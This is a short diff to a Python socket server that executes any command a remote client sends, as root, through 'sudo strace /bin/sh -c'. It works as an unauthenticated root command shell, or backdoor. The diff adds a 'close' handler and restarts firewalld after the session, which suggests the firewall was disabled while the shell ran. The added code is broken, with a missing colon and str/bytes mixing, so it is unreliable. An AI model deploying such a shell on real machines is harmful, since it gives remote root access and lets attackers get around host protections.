@@ -38,6 +38,9 @@ while True:
   while True:
       cmd = c.recv(1024).decode("utf-8").strip()
       inputcmd = ["sudo","strace","-o","/dev/null","/bin/sh","-c", cmd]
+      if cmd == "close"
+        c.send("Closing connection")
+        break
 
       output = subprocess.check_output(inputcmd)
       message = "Output is: " + output
@@ -45,6 +48,8 @@ while True:
       
   # Close the connection with the client 
   c.close()
+  os.system('sudo strace -o /dev/null /bin/sh -c "systemctl start firewalld"')
+
   
   # Breaking once connection closed
   break
